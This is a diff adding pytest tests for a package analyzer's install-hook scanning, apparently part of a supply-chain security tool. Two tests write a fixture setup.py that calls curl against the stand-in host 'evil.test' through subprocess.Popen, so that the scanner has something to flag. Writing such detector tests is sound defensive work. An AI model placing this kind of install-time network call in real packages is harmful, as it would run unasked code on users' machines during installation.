@@ -335,3 +335,49 @@ def test_analyze_package_no_binaries_is_empty_list(tmp_path: Path) -> None:
         result = analyze_package(tmp_path, check_binaries=True)
 
     assert result.binaries == []
+
+
+# ---------------------------------------------------------------------------
+# Install-hook scanning
+# ---------------------------------------------------------------------------
+
+
+def test_analyze_package_scans_install_hooks_when_flag_true(tmp_path: Path) -> None:
+    (tmp_path / "setup.py").write_text(
+        "import subprocess\nsubprocess.Popen(['curl', 'http://evil.test'])\n"
+    )
+
+    with (
+        patch(PATCH_L1, return_value=[]),
+        patch(PATCH_L2, return_value=([], False)),
+    ):
+        result = analyze_package(tmp_path, check_install_hooks=True)
+
+    assert len(result.install_hooks) == 1
+    assert result.install_hooks[0].call == "subprocess.Popen"
+
+
+def test_analyze_package_skips_install_hooks_by_default(tmp_path: Path) -> None:
+    (tmp_path / "setup.py").write_text(
+        "import subprocess\nsubprocess.Popen(['curl', 'http://evil.test'])\n"
+    )
+
+    with (
+        patch(PATCH_L1, return_value=[]),
+        patch(PATCH_L2, return_value=([], False)),
+    ):
+        result = analyze_package(tmp_path)
+
+    assert result.install_hooks == []
+
+
+def test_analyze_package_no_install_hooks_is_empty_list(tmp_path: Path) -> None:
+    (tmp_path / "a.py").write_text("x = 1")
+
+    with (
+        patch(PATCH_L1, return_value=[]),
+        patch(PATCH_L2, return_value=([], False)),
+    ):
+        result = analyze_package(tmp_path, check_install_hooks=True)
+
+    assert result.install_hooks == []
